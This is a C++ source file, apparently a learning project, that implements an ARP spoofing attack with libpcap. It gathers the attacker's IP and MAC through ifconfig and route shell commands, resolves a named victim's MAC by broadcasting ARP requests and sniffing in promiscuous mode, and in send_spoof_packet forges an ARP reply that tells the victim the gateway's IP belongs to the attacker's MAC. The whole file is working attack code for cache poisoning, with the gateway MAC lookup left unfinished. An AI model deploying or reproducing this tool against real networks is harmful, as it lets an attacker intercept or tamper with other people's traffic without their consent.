#include "MyARPSend.h"
#include "MyETHER.h"
#include "MyARP.h"
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <unistd.h>
#include <stdint.h>
#include <pcap.h>

MyARPSend::MyARPSend()
{
    this->victim_ip = "";
    this->victim_mac = "";
    this->gateway_ip = "";
    this->gateway_mac = "";
    this->my_ip = "";
    this->my_mac = "";
}

MyARPSend::MyARPSend(string &input)
{
    this->victim_ip = input;
    this->set_arp_spoofing_attack();
}

void MyARPSend::set_arp_spoofing_attack()
{
    this->get_my_ip();
    this->get_my_mac();
    this->get_gateway_ip();

    this->get_victim_mac();
    this->get_gateway_mac();
}

void MyARPSend::get_my_ip()
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"/sbin/ifconfig ens33 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'");
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};

    if(fgets(line, sizeof(line), fp) != NULL)
        this->my_ip = string(line);
    else
    {
        perror("Cannot get my ip address");
        exit(1);
    }

    pclose(fp);
}

void MyARPSend::get_my_mac()
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"/sbin/ifconfig ens33 | grep 'HWaddr' | awk '{ print $5}'");
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};

    if(fgets(line, sizeof(line), fp) != NULL)
        this->my_mac = string(line);
    else
    {
        perror("Cannot get my mac address");
        exit(1);
    }

    pclose(fp);
}

void MyARPSend::get_gateway_ip()
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"route -n | grep ens33  | grep 'UG[ \t]' | awk '{print $2}'");
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};

    if(fgets(line, sizeof(line), fp) != NULL)
        this->gateway_ip = string(line);
    else
    {
        perror("Cannot get gateway's ip address");
        exit(1);
    }

    pclose(fp);
}

void MyARPSend::get_victim_mac()
{
    this->convert_ip_to_MAC(victim_ip, victim_mac);
}

void MyARPSend::get_gateway_mac() // for later use
{
    //this->convert_ip_to_MAC(gateway_ip, gateway_mac);
}

void MyARPSend::convert_ip_to_MAC(string &IP, string &MAC)
{
    int pid = fork();

    if(pid == -1)
    {
        perror("Fork Error!!");
        exit(0);
    }
    else if(pid == 0)
    {
        sleep(1);
        uint8_t packet[1000];
        int size = 0;

        MyETHER *ptrETHER = (MyETHER *)&packet;

        ptrETHER->setDhostBroadCastFF();
        ptrETHER->setShost(my_mac);
        ptrETHER->set_ether_type(ETHERTYPE_ARP);

        size += sizeof(MyETHER);

        MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));

        ptrARP->set_ar_hrd(ARPHRD_ETHER);
        ptrARP->set_ar_pro(ETHERTYPE_IP);
        ptrARP->set_ar_hln(ETHER_ADDR_LEN);
        ptrARP->set_ar_pln(IPV4_ADDR_LEN);
        ptrARP->set_ar_op(ARPOP_REQUEST);

        ptrARP->set_arp_sha(my_mac);
        ptrARP->set_arp_spa(my_ip);
        ptrARP->set_arp_tha_broad_cast_00();
        ptrARP->set_arp_tpa(IP);

        size += sizeof(MyARP);

        this->sendpacket(packet, size);
        exit(0);
    }
    else
    {
        pcap_t *handle = NULL;          /* Session handle */
        char *dev = NULL;           /* The device to sniff on */
        char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

        bpf_u_int32 mask = 0;       /* Our netmask */
        bpf_u_int32 net = 0;        /* Our IP */

        /* Define the device */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL)
        {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            exit(2);
        }

        /* Find the properties for the device */
        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
        {
            fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
            net = 0;
            mask = 0;
            exit(2);
        }

        /* Open the session in promiscuous mode */
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL)
        {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            exit(2);
        }

        int res = 0;
        struct pcap_pkthdr *header = NULL;  /* The header that pcap gives us */
        const uint8_t *packet = NULL;        /* The actual packet */

        while((res = pcap_next_ex(handle, &header, &packet)) >= 0)
        {
            if(res==0)
                continue;

            MyETHER *ptrETHER = (MyETHER *)packet;

            if( ptrETHER->get_ether_type() == ETHERTYPE_ARP)
            {
                MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));
                string tmp_IP;
                ptrARP->get_arp_tpa(tmp_IP);

                if(tmp_IP == IP)
                {
                    string tmp_MAC;
                    ptrARP->get_arp_tha(tmp_MAC);
                    MAC = tmp_MAC;
                    break;
                }
            }
        }

        pcap_close(handle);
    }
}

void MyARPSend::sendpacket(uint8_t *buf, int size)
{
    pcap_t *handle = NULL;          /* Session handle */
    char *dev = NULL;           /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

    bpf_u_int32 mask = 0;       /* Our netmask */
    bpf_u_int32 net = 0;        /* Our IP */

    /* Define the device */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL)
    {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        exit(2);
    }

    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
    {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
        exit(2);
    }

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(2);
    }

    /* Send down the packet */
    if (pcap_sendpacket(handle, buf, size /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n");
        return;
    }

    pcap_close(handle);
}

void MyARPSend::send_request_packet()
{
    uint8_t packet[1000];
    int size = 0;

    MyETHER *ptrETHER = (MyETHER *)&packet;

    ptrETHER->setDhostBroadCastFF();
    ptrETHER->setShost(my_mac);
    ptrETHER->set_ether_type(ETHERTYPE_ARP);

    size += sizeof(MyETHER);

    MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));

    ptrARP->set_ar_hrd(ARPHRD_ETHER);
    ptrARP->set_ar_pro(ETHERTYPE_IP);
    ptrARP->set_ar_hln(ETHER_ADDR_LEN);
    ptrARP->set_ar_pln(IPV4_ADDR_LEN);
    ptrARP->set_ar_op(ARPOP_REQUEST);

    ptrARP->set_arp_sha(my_mac);
    ptrARP->set_arp_spa(my_ip);
    ptrARP->set_arp_tha_broad_cast_00();
    ptrARP->set_arp_tpa(victim_ip);

    size += sizeof(MyARP);

    this->sendpacket(packet, size);
}

void MyARPSend::send_spoof_packet()
{
    uint8_t packet[1000];
    int size = 0;

    MyETHER *ptrETHER = (MyETHER *)&packet;

    ptrETHER->setDhostBroadCastFF();
    ptrETHER->setShost(my_mac);
    ptrETHER->set_ether_type(ETHERTYPE_ARP);

    size += sizeof(MyETHER);

    MyARP *ptrARP = (MyARP *)(packet + sizeof(MyETHER));

    ptrARP->set_ar_hrd(ARPHRD_ETHER);
    ptrARP->set_ar_pro(ETHERTYPE_IP);
    ptrARP->set_ar_hln(ETHER_ADDR_LEN);
    ptrARP->set_ar_pln(IPV4_ADDR_LEN);
    ptrARP->set_ar_op(ARPOP_REPLY);

    ptrARP->set_arp_sha(my_mac);
    ptrARP->set_arp_spa(gateway_ip);
    ptrARP->set_arp_tha(victim_mac);
    ptrARP->set_arp_tpa(victim_ip);

    size += sizeof(MyARP);

    this->sendpacket(packet, size);
}
